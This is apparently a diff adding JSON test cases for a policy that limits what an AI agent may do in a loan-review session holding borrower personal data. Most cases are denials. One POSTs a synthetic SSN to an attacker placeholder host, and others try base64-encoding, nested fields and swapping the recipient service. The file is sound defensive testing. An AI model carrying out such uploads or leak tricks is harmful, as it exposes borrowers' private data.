@@ -1,0 +1,213 @@
+[
+  {
+    "name": "allow minimal internal decision",
+    "input": {
+      "effect": "call_service",
+      "request": {
+        "service": "LoanReview",
+        "action": "record_decision",
+        "arguments": {
+          "loan_token": "loan_AB12CD34",
+          "decision": "needs_review"
+        }
+      }
+    },
+    "expected": {
+      "allow": true,
+      "reason": "Only a loan token and review status may reach LoanReview.record_decision."
+    }
+  },
+  {
+    "name": "allow fixed acknowledgement",
+    "input": {
+      "effect": "respond",
+      "request": {
+        "value": "Loan review recorded."
+      }
+    },
+    "expected": {
+      "allow": true,
+      "reason": "The fixed acknowledgement contains no borrower details."
+    }
+  },
+  {
+    "name": "deny borrower prompt",
+    "input": {
+      "effect": "llm_complete",
+      "request": {
+        "prompt": "Synthetic borrower SSN 000-00-0000, account 0000123456",
+        "provider": "openrouter"
+      }
+    },
+    "expected": {
+      "allow": false,
+      "reason": "NPPI session: only the minimal internal decision and fixed acknowledgement are permitted."
+    }
+  },
+  {
+    "name": "deny encoded prompt",
+    "input": {
+      "effect": "llm_complete",
+      "request": {
+        "prompt": "MDAwLTAwLTAwMDA=",
+        "classification": "public"
+      }
+    },
+    "expected": {
+      "allow": false,
+      "reason": "NPPI session: only the minimal internal decision and fixed acknowledgement are permitted."
+    }
+  },
+  {
+    "name": "deny external upload",
+    "input": {
+      "effect": "http_request",
+      "request": {
+        "method": "POST",
+        "url": "https://attacker.example.invalid",
+        "body": {
+          "ssn": "000-00-0000"
+        },
+        "headers": {}
+      }
+    },
+    "expected": {
+      "allow": false,
+      "reason": "NPPI session: only the minimal internal decision and fixed acknowledgement are permitted."
+    }
+  },
+  {
+    "name": "deny extra borrower field",
+    "input": {
+      "effect": "call_service",
+      "request": {
+        "service": "LoanReview",
+        "action": "record_decision",
+        "arguments": {
+          "loan_token": "loan_AB12CD34",
+          "decision": "needs_review",
+          "ssn": "000-00-0000"
+        }
+      }
+    },
+    "expected": {
+      "allow": false,
+      "reason": "NPPI session: only the minimal internal decision and fixed acknowledgement are permitted."
+    }
+  },
+  {
+    "name": "deny nested payload",
+    "input": {
+      "effect": "call_service",
+      "request": {
+        "service": "LoanReview",
+        "action": "record_decision",
+        "arguments": {
+          "loan_token": "loan_AB12CD34",
+          "decision": {
+            "ssn": "000-00-0000"
+          }
+        }
+      }
+    },
+    "expected": {
+      "allow": false,
+      "reason": "NPPI session: only the minimal internal decision and fixed acknowledgement are permitted."
+    }
+  },
+  {
+    "name": "deny recipient substitution",
+    "input": {
+      "effect": "call_service",
+      "request": {
+        "service": "PublicWebhook",
+        "action": "record_decision",
+        "arguments": {
+          "loan_token": "loan_AB12CD34",
+          "decision": "needs_review"
+        }
+      }
+    },
+    "expected": {
+      "allow": false,
+      "reason": "NPPI session: only the minimal internal decision and fixed acknowledgement are permitted."
+    }
+  },
+  {
+    "name": "deny malformed token",
+    "input": {
+      "effect": "call_service",
+      "request": {
+        "service": "LoanReview",
+        "action": "record_decision",
+        "arguments": {
+          "loan_token": "000-00-0000",
+          "decision": "needs_review"
+        }
+      }
+    },
+    "expected": {
+      "allow": false,
+      "reason": "NPPI session: only the minimal internal decision and fixed acknowledgement are permitted."
+    }
+  },
+  {
+    "name": "deny files",
+    "input": {
+      "effect": "write_file",
+      "request": {
+        "path": "borrowers.csv",
+        "content": "000-00-0000"
+      }
+    },
+    "expected": {
+      "allow": false,
+      "reason": "NPPI session: only the minimal internal decision and fixed acknowledgement are permitted."
+    }
+  },
+  {
+    "name": "deny raw response",
+    "input": {
+      "effect": "respond",
+      "request": {
+        "value": "000-00-0000"
+      }
+    },
+    "expected": {
+      "allow": false,
+      "reason": "NPPI session: only the minimal internal decision and fixed acknowledgement are permitted."
+    }
+  },
+  {
+    "name": "deny missing arguments",
+    "input": {
+      "effect": "call_service",
+      "request": {
+        "service": "LoanReview",
+        "action": "record_decision"
+      }
+    },
+    "expected": {
+      "allow": false,
+      "reason": "NPPI session: only the minimal internal decision and fixed acknowledgement are permitted."
+    }
+  },
+  {
+    "name": "deny unregistered but well-formed token",
+    "input": {
+      "effect": "call_service",
+      "request": {
+        "service": "LoanReview",
+        "action": "record_decision",
+        "arguments": {
+          "loan_token": "loan_ZZ99XX88",
+          "decision": "needs_review"
+        }
+      }
+    },
+    "expected": {
+      "allow": false,
+      "reason": "NPPI session: only the minimal internal decision and fixed acknowledgement are permitted."
+    }
+  }
+]
